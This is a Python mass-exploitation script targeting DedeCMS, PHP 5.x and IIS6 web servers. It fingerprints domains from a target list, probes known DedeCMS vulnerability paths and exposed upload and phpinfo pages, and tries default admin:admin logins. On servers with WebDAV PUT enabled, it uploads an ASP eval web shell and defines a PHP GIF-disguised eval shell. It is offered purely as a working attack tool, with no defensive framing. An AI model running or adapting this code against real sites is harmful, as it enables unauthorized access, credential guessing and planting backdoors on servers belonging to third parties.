#!/usr/bin/env python3
"""DedeCMS + PHP5.x + IIS6 专杀脚本"""
import subprocess, re

SHELL = 'GIF89a;<?php @eval($_POST["c"]);?>'

def curl(url, data=None, timeout=10):
    cmd = ["curl", "-skL", "--connect-timeout", "5", "--max-time", str(timeout)]
    if data: cmd += ["-X", "POST", "-d", data]
    cmd += ["-o", "/dev/null", "-w", "%{http_code}"]
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
    return r.stdout.strip()

def curl_body(url, data=None):
    cmd = ["curl", "-skL", "--connect-timeout", "5", "--max-time", "10"]
    if data: cmd += ["-X", "POST", "-d", data]
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    return r.stdout[:2000]

# ====== 1. DedeCMS RCE (CVE-2022-35516, CVE-2018-6910等) ======
def dedecms_rce(domain):
    print("[" + domain + "] DedeCMS...")
    base = "http://" + domain
    
    # CVE-2022-35516: /dede/file_manage_control.php RCE
    paths = [
        "/dede/file_manage_control.php?fmdo=upload&activepath=/",
        "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=",
        "/dede/archives_do.php?aid=1&dopost=uploadLitpic",
        "/include/dialog/select_soft_post.php",
    ]
    for p in paths:
        code = curl(base + p)
        if code == "200":
            print("  [+] " + p)

    # Try common dede admin passwords
    dede_urls = [
        ("/dede/", "admin", "admin"),
        ("/dede/login.php", "admin", "admin"),
    ]
    for path, user, pw in dede_urls:
        code = curl(base + path + "?gotopage=/dede/")
        if code in ("200", "302"):
            body = curl_body(base + path, "userid="+user+"&pwd="+pw+"&gotopage=/dede/")
            if "dede_admin" in body.lower() or "管理" in body:
                print("  [!] DEDE LOGIN: " + user + ":" + pw)

# ====== 2. PHP 5.x 文件包含/上传 ======
def php5_attack(domain):
    print("[" + domain + "] PHP5.x...")
    base = "http://" + domain
    
    # Common PHP5 RCE: /info.php, /test.php, /phpinfo.php
    for p in ["/info.php", "/test.php", "/phpinfo.php", "/phpmyadmin/"]:
        code = curl(base + p)
        if code == "200":
            print("  [+] " + p)

    # File upload common paths
    for p in ["/upload.php", "/admin/upload.php", "/editor/upload.php", "/fckeditor/editor/filemanager/connectors/php/upload.php"]:
        code = curl(base + p)
        if code != "404" and code != "000":
            print("  [*] " + p + " -> " + code)

# ====== 3. IIS6 WebDAV/PUT ======
def iis6_attack(domain):
    print("[" + domain + "] IIS6...")
    base = "http://" + domain
    
    # IIS6 WebDAV PUT上传
    r = subprocess.run(["curl", "-sk", "-X", "PUT", base + "/test.txt", 
                        "-d", "test", "-w", "%{http_code}", "-o", "/dev/null"],
                       capture_output=True, text=True, timeout=10)
    if r.stdout.strip() in ("201", "200"):
        print("  [!] WebDAV PUT enabled!")
        # Try uploading ASP shell
        subprocess.run(["curl", "-sk", "-X", "PUT", base + "/shell.asp",
                        "-d", "<%eval request(\"c\")%>"], capture_output=True)
        code = curl(base + "/shell.asp")
        if code == "200":
            print("  [!] ASP SHELL: " + base + "/shell.asp")

    # IIS6 short name exploit
    r = subprocess.run(["curl", "-sk", base + "/aa*~1****/a.aspx"],
                       capture_output=True, text=True, timeout=10)
    if "404" not in r.stderr and "400" not in r.stderr:
        print("  [*] IIS shortname possible")

# ====== Main ======
def main(target_file):
    with open(target_file) as f:
        targets = [l.strip() for l in f if l.strip()]
    
    for d in targets:
        code = curl("http://" + d + "/")
        if code == "000": 
            continue
        
        hdrs = subprocess.run(["curl", "-skI", "--connect-timeout", "5", "--max-time", "8",
                               "http://" + d + "/"], capture_output=True, text=True).stdout
        
        hdr_low = hdrs.lower()
        if "dede" in hdr_low or "织梦" in hdr_low:
            dedecms_rce(d)
        elif "php/5" in hdr_low or "php/4" in hdr_low:
            php5_attack(d)
        elif "iis/6" in hdr_low or "iis/7" in hdr_low or "asp.net" in hdr_low:
            iis6_attack(d)
        elif "thinkphp" in hdr_low:
            php5_attack(d)

if __name__ == "__main__":
    import sys
    f = sys.argv[1] if len(sys.argv) > 1 else "/tmp/old_targets.txt"
    main(f)
